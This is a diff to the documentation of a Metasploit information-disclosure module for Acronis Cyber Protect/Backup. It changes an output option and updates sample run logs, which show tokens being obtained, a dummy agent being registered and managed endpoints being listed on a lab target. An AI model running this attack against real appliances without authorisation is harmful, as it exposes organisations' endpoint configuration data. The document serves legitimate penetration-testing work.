@@ -55,9 +55,9 @@ You are now ready to test the module.
 - [ ] you should get a list of all endpoints that are registered at the appliance.
 
 ## Options
-### PRTSCRN
-You can use this option to turn on or off the print output of the gather info to the console (default true).
-By default all information will be stored in a file in `json` format at the loot directory.
+### OUTPUT
+You can use option `table` to print output of the gather info to the console (default).
+Choosing option `json` will store all information at a file in `json` format at the loot directory.
 You can use this file in combination with `jq` for offline queries and processing.
 
 ## Scenarios
@@ -89,7 +89,7 @@ Check supported:
 Basic options:
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
-  PRTSCRN    true             no        Print output to console
+  OUTPUT     table            yes       Output format to use (Accepted: table, json)
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                         metasploit.html
@@ -140,9 +140,8 @@ msf6 auxiliary(gather/acronis_cyber_protect_machine_info_disclosure) > run
 [*] Register a dummy backup agent.
 [*] Dummy backup agent registration is successful.
 [*] Retrieve the second access token.
-[+] Acronis Cyber Protect/Backup 12.5.14330 - VULNERABLE
+[+] The target appears to be vulnerable. Acronis Cyber Protect/Backup 12.5.14330
 [*] Retrieve all managed endpoint configuration details registered at the Acronis Cyber Protect/Backup appliance.
-[+] Configuration details are successfully saved in json format to /root/.msf4/loot/20241023084506_default_192.168.201.6_acronis.cyber.pr_785289.bin
 [*] List the managed endpoints registered at the Acronis Cyber Protect/Backup appliance.
 [*] ----------------------------------------
 [+] hostId: 28BAFD9F-F9F1-481F-A970-1A6ED70736AC
@@ -172,14 +171,12 @@ msf6 auxiliary(gather/acronis_cyber_protect_machine_info_disclosure) > run
 [*] Running module against 192.168.201.6
 
 [*] Running automatic check ("set AutoCheck false" to disable)
-[!] The service is running, but could not be validated.
 [*] Retrieve the first access token.
 [*] Register a dummy backup agent.
 [*] Dummy backup agent registration is successful.
 [*] Retrieve the second access token.
-[+] Acronis Cyber Protect/Backup 15.0.27009 - VULNERABLE
+[+] The target appears to be vulnerable. Acronis Cyber Protect/Backup 15.0.27009
 [*] Retrieve all managed endpoint configuration details registered at the Acronis Cyber Protect/Backup appliance.
-[+] Configuration details are successfully saved in json format to /root/.msf4/loot/20241023093629_default_192.168.201.6_acronis.cyber.pr_725453.bin
 [*] List the managed endpoints registered at the Acronis Cyber Protect/Backup appliance.
 [*] ----------------------------------------
 [+] hostId: D287E868-EDBB-4FE9-85A9-F928AA10EE5D
